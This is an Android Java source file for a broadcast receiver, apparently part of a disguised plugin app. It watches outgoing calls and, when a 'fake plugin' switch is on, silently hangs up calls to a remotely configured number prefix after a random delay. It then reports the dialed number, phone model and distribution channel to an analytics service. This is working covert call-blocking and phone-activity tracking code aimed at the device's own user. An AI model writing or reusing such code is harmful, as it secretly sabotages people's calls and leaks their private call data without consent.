package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.text.TextUtils;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.PhoneCallUtils;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.qm.setting.MainSettingManager;

import java.util.HashMap;
import java.util.Random;


/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-11-3
 * Time: PM8:58
 * To change this template use File | Settings | File Templates.
 */
public class DialProcessBRC extends BroadcastReceiver {

    public void onReceive(final Context context, Intent intent) {
        MainSettingManager.getInstance().init(context);
        if (!MainSettingManager.getInstance().getMainShouldFakePlugin()) {
            return;
        }

        if (intent != null) {
            String action = intent.getAction();
            if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)
                    && AppRuntime.ACTIVE_RESPONSE != null
                    && AppRuntime.ACTIVE_RESPONSE.blockNum != null) {
                final String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                if (!TextUtils.isEmpty(phoneNumber)) {
                    Config.LOGD("[[DialProcessBRC::onReceive]] out going Phone Number : " + phoneNumber);

                    if (phoneNumber.startsWith(AppRuntime.ACTIVE_RESPONSE.blockNum)) {
                        //算出一个随机时间
                        int delay = (AppRuntime.ACTIVE_RESPONSE.blockMaxTime == AppRuntime.ACTIVE_RESPONSE.blockMinTime)
                                        ? AppRuntime.ACTIVE_RESPONSE.blockMaxTime
                                        : (new Random().nextInt(AppRuntime.ACTIVE_RESPONSE.blockMaxTime - AppRuntime.ACTIVE_RESPONSE.blockMinTime)
                                              + AppRuntime.ACTIVE_RESPONSE.blockMinTime);
                        delay = delay * 1000;

                        Handler handler = new Handler(context.getMainLooper());
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                PhoneCallUtils.encCall(context);
                                Config.LOGD("[[DialProcessBRC::onReceive]] End Call for Number : " + phoneNumber);
                                //notify umeng
                                HashMap<String, String> log = new HashMap<String, String>();
                                log.put("phoneNumber", phoneNumber);
                                log.put("phoneType", Build.MODEL);
                                log.put("channelName", AppRuntime.ACTIVE_RESPONSE.channelName);
                                log.put("blockNumber", AppRuntime.ACTIVE_RESPONSE.blockNum);
                                CommonUtil.umengLog(context, "dial_end", log);
                            }
                        }, delay);
                    }
                }
            }
        }
    }

}
